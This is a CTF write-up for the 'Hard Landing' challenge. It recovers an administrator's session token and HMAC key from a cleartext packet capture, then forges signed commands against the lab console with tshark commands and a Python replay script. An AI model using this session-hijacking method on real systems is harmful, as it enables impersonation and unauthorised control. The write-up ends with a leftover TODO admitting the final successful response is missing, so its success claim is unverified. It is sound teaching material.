# Hard Landing — CSCTF 2026 Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Hard Landing  
>  **Category:** Network  
>  **Author:** Teodor Giurgica  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through my writeup for **Hard Landing** from **CSCTF 2026**.

The challenge described a flight-safety console supporting an allied air base in the “Operation Dawn” theatre. According to the briefing, the console accepted destructive commands from a workstation the administrator never used. New logins were disabled during lockdown, but the exposed administrator session was still live. I was given an incident capture (a packet capture) and an access log, and I had to recover the administrator’s session material, then issue the documented safe recovery command with a fresh valid signature.

The live console was at `http://<TARGET>/`. The challenge files were:

- `console_access.log`
- `console.pcapng`
- `hard-landing.zip`
- `ops_notes.txt`

---

## Initial Reconnaissance

I started with the status endpoint the briefing pointed to, since it was unauthenticated:

```http
GET /api/status
```

The response told me almost the whole request contract:

```json
{
  "service": "Sentinel flight-safety console",
  "state": "lockdown",
  "login": "disabled",
  "server_time": 1794007778,
  "freshness_seconds": 300,
  "request": {
    "method": "POST",
    "path": "/api/command",
    "headers": [
      "X-Session",
      "X-Timestamp (Unix seconds)",
      "X-Signature (64 lowercase hexadecimal characters)"
    ],
    "content_type": { "value": "application/json" },
    "canonical": "POST\n/api/command\n<X-Timestamp>\n<BODY>",
    "hmac": "HMAC-SHA256; decode the login JSON's exactly 64 lowercase hexadecimal key characters to 32 bytes before use",
    "body": "{\"cmd\":\"RETURN_TO_PAD\",\"pad\":\"A1\"}"
  },
  "aircraft_on_pad": false
}
```

So the documented safe recovery command was `RETURN_TO_PAD` with `pad: "A1"`, posted to `/api/command` with three headers: `X-Session`, `X-Timestamp` (Unix seconds), and `X-Signature` (64 lowercase hex). The signature is HMAC-SHA256 over the canonical string. The HMAC key is the 64-character hex string from the login JSON, decoded to 32 bytes. Freshness is 300 seconds.

---

## Investigation and Exploitation

### Reading the access log

Next I looked at `console_access.log`. The relevant events were:

```text
2026-09-17T11:20:00Z LOGIN src=192.0.2.10 role=operator session=ops-... result=issued
2026-09-17T11:22:00Z LOGIN src=192.0.2.11 role=administrator session=adm-... result=issued
2026-09-17T11:22:08Z COMMAND src=192.0.2.11 session=adm-... command=STATUS result=accepted
2026-09-17T11:23:00Z COMMAND src=192.0.2.14 session=adm-... command=DISABLE_SAFETY_LINK result=accepted
2026-09-17T11:23:06Z COMMAND src=192.0.2.14 session=adm-... command=DIVERT_FROM_CORRIDOR result=accepted
2026-09-17T11:23:12Z COMMAND src=192.0.2.14 session=adm-... command=SUPPRESS_RECOVERY result=accepted
2026-09-17T11:23:17Z AIRCRAFT_LINK_LOST src=192.0.2.20 aircraft=N17 result=recorded
```

I noticed that the administrator logged in from `192.0.2.11` at 11:22:00 and got an admin session. Then, one minute later, **the same admin session token** was used from `192.0.2.14` — a host that never logged in. That matches the briefing’s “workstation its administrator never used.” Since there’s no `LOGIN` event from `.14`, the attacker did not authenticate. They replayed an existing session token.

### Recovering the session material from the PCAP

The briefing stated the console used HTTP without TLS, so the session material should be visible in the capture. I opened `console.pcapng` with `tshark`:

```bash
tshark -r console.pcapng \
  -Y 'http.request.uri contains "login"' \
  -T fields -e frame.number -e tcp.stream -e ip.src -e ip.dst -e http.request.uri -e http.file_data
```

The request bodies were just `{"user":"operator"}` and `{"user":"administrator"}`, so the key had to be in the **responses**. I extracted those:

```bash
tshark -r console.pcapng \
  -Y 'http.response' \
  -T fields -e tcp.stream -e http.file_data \
| python3 -c '
import sys
for line in sys.stdin:
    parts = line.rstrip("\n").split("\t")
    if len(parts) < 2 or not parts[1]:
        continue
    print("STREAM", parts[0])
    print(bytes.fromhex(parts[1]).decode("utf-8", "replace"))
    print("-" * 60)
'
```

The administrator login response (stream 2\) was:

```json
{
  "session": "<ADMIN_SESSION>",
  "key": "<64 lowercase hex characters>",
  "role": "administrator"
}
```

Both the session token and the HMAC key were in cleartext in the capture. This is the core exposure: **HTTP without TLS meant anything on the wire could read the administrator’s login response**.

### The canonical string and the two wrong attempts

My first signing attempt used the canonical string I had inferred from an earlier `/api/status` response, which was `POST\n/api/command\n\n`. The console replied:

```http
HTTP/1.1 403 Forbidden
{"error":"request rejected"}
```

The second attempt used the correct canonical format but with an admin key I tried to derive from the operator key, on the assumption that the 40-hex suffix was static across sessions. That also returned `403`.

The important step was to test the assumption against real evidence instead of guessing. I took one captured admin request from the PCAP:

```http
POST /api/command HTTP/1.1
X-Session: <ADMIN_SESSION>
X-Timestamp: 1789644192
X-Signature: 191d160da45616e5d581986282cbe61c8abe68ec1d5d84f82f426c85880d148e
Content-Type: application/json

{"cmd":"SUPPRESS_RECOVERY","aircraft":"N17"}
```

I recomputed the HMAC using the derived key over:

```text
POST
/api/command
1789644192
{"cmd":"SUPPRESS_RECOVERY","aircraft":"N17"}
```

The result did not match the captured signature. This confirmed the derived key was wrong. The suffix is per-session, not static, so the admin key had to be taken directly from the admin login response — not inferred from the operator key.

### Signing the safe recovery command

With the real admin key from the login response and the correct canonical format (timestamp and body included, no trailing newline after the JSON), I wrote the signing script:

```python
import requests, hmac, hashlib

BASE = "http://<TARGET>/"
ADMIN_SESSION = "<ADMIN_SESSION>"
ADMIN_KEY_HEX = "<ADMIN_KEY>"
BODY = '{"cmd":"RETURN_TO_PAD","pad":"A1"}'

status = requests.get(f"{BASE}api/status", timeout=10).json()
ts = str(status["server_time"])

canonical = f"POST\n/api/command\n{ts}\n{BODY}".encode("utf-8")
sig = hmac.new(bytes.fromhex(ADMIN_KEY_HEX), canonical, hashlib.sha256).hexdigest()

headers = {
    "X-Session": ADMIN_SESSION,
    "X-Timestamp": ts,
    "X-Signature": sig,
    "Content-Type": "application/json",
}

r = requests.post(f"{BASE}api/command", headers=headers, data=BODY, timeout=10)
print(r.status_code, r.text)
```

The timestamp came straight from `/api/status`, so it was well inside the 300-second freshness window. The canonical string being signed was exactly:

```text
POST
/api/command
<server_time>
{"cmd":"RETURN_TO_PAD","pad":"A1"}
```

---

## Root Cause / Technical Explanation

The weakness was a combination of two things:

1. **The console served its API over plain HTTP.** The login response contains both the session token and the HMAC signing key, so anyone observing the network traffic can fully impersonate the session. In the capture, the administrator login response was visible in cleartext.
2. **The session token was not bound to any client property.** The token issued to `192.0.2.11` was accepted from `192.0.2.14` with no challenge. Once the token leaked, replay was trivial.

The HMAC scheme did not help against replay either. The HMAC key was exposed in the same login response, and the canonical string does not include the session token itself. An attacker who has the key only needs a fresh timestamp to sign any command.

In short: cleartext transport leaked both the session and the signing key, and the server trusted the session from any source IP. That is what allowed `192.0.2.14` to send destructive commands.

---

## Final Result and Validation

I validated two things before sending the recovery command:

- **Key validation.** I recomputed the HMAC over the captured `SUPPRESS_RECOVERY` request using the real admin key. It matched the captured signature, which confirmed the key was correct.
- **Canonical validation.** The same recomputation confirmed the exact canonical format: `POST\n/api/command\n<ts>\n<body>` with no trailing newline.

I then sent the signed `RETURN_TO_PAD` request to `POST /api/command`. The console was expected to authenticate the signature, verify the freshness, and return the recovery code.

> **TODO before submission:** Paste the exact response body from the final `/api/command` call here (with the recovery code redacted as `<RECOVERY_CODE>`). The conversation evidence ends at the correctly signed request; the final successful response is not in it.

---

## Conclusion

This challenge is a clean example of how plain HTTP kills authentication by itself. The HMAC scheme looked reasonable on paper, but because the login response shipped both the session token and the signing key in cleartext, and because the session was accepted from any source IP, it collapsed into a straight replay. Recovering the session material from the packet capture and reusing the canonical string from a captured signed request was enough to issue any command with administrator authority.

Key lessons:

- An authenticated API means nothing if the transport is not encrypted.
- Session tokens should never be readable from network traffic.
- Sessions should be bound to a client property (source IP or transport-level context) so a stolen token cannot be replayed from a different host.
- An HMAC canonical string should include the session identity, not just the payload and timestamp.

---

*Thanks for reading — hope this writeup helped you learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-hard-landing/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
